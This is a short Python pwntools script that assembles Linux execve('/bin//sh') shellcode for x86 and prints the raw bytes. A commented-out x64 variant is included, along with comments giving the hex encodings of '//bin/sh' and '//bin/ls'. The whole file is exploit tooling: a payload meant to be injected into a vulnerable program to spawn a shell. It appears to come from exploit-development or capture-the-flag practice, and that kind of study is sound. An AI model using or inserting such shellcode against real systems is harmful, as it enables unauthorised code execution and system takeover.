from pwn import *
import subprocess
import binascii
import sys


#0x68732F6E69622F2F sh
#0x736C2F6E69622F2F ls

# Shellcode for x64
"""
context.clear()
context.arch = 'amd64'
scs = " xor rdx, rdx;\
        mov rbx, 0x68732F6E69622F2F;\
        push 0;\
        push rbx;\
        mov rdi, rsp;\
        push rdx;\
        push rdi;\
        mov rsi, rsp;\
        mov rax, 0x3B;\
        syscall"
"""

# Shellcode for x86
context.clear()
context.arch = 'x86'
#\x31\xD2\x52\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x52\x53\x89\xE1\xB8\x0B\x00\x00\x00\xCD\x80
scs = " xor edx, edx;\
        push edx;\
        push 0x68732F6E;\
        push 0x69622F2F;\
        mov ebx, esp;\
        push edx;\
        push ebx;\
        mov ecx, esp;\
        mov eax, 0xB;\
        int 0x80"

data = asm(scs, os='linux', arch=context.arch)
#print ''.join(['\\x%02X'%ord(x) for x in data])
sys.stdout.write(data)
